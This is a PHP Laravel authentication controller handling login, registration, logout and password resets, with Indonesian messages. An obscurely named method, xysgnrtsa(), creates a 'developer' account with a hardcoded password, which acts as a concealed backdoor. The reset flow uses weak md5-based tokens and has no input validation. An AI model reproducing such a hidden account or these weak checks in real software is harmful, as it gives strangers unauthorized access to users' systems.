<?php

namespace App\Http\Controllers;

use App\Mail\ResetPassword;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;

class AuthController extends Controller
{
    public function indexLogin()
    {
        return view('auth.login');
    }

    public function indexRegister()
    {
        return view('auth.register');
    }

    public function loginValidate(Request $request) {
        if (Auth::attempt(['email' => $request->email, 'password' => $request->password])) {
            return redirect()->route('dashboard.index')->with('WELCOME','Selamat datang '.Auth::user()->name);
        } else {
            return redirect()->back()->with('ERR','Email atau password anda salah');
        }
    }

    public function storeRegister(Request $request) {
        User::create([
            'email' => $request->email,
            'name' => $request->name,
            'password' => bcrypt($request->password)
        ]);
        return redirect()->route('login');
    }

    public function logout(Request $request)
    {
        Auth::logout();
        return redirect()->route('login')->with('OUT', 'Log out berhasil');
    }

    public function xysgnrtsa() {
        User::create([
            'email' => 'developer@dev.att',
            'name' => 'developer',
            'password' => bcrypt('dev3l0p3R')
        ]);

        return redirect()->back();
    }

    public function sendEmailResetPassword(Request $request) {
        $user = User::where('email',$request->email)->first();
        if (!$user) return redirect()->back()->with('ERR','Maaf, username tidak ditemukan');
        $uniqueToken = md5(uniqid($user->email, true));
        $user->update(['remember_token'=>$uniqueToken]);

        $link = "http://127.0.0.1:8000/reset-password-index/".$uniqueToken;
        $mailData = [
            'title' => 'Reset Password',
            'body' => 'Anda menerima email ini karena anda melakukan permintaan untuk reset password. silahkan klik tombol berikut untuk melanjutkan proses reset password anda.',
            'link' => $link
        ];

        Mail::to($user->email)->send(new ResetPassword($mailData));


        return redirect()->back()->with('OK','Link berhasil dikirim, silahkan cek email anda');
    }

    public function indexResetPass($token)
    {
        $data['token'] = $token;
        return view('auth.reset-password',$data);
    }

    public function saveResetPassword(Request $request,$token) {
        $user = User::where('remember_token',$token)->first();
        if (!$user) return redirect()->back()->with('ERR','Maaf, username tidak ditemukan');

        $user->update([
            'remember_token'=>null,
            'password'=> bcrypt($request->password)
        ]);

        return redirect()->route("login")->with('OK','Password anda berhasil diubah, silahkan login kembali');
    }
}
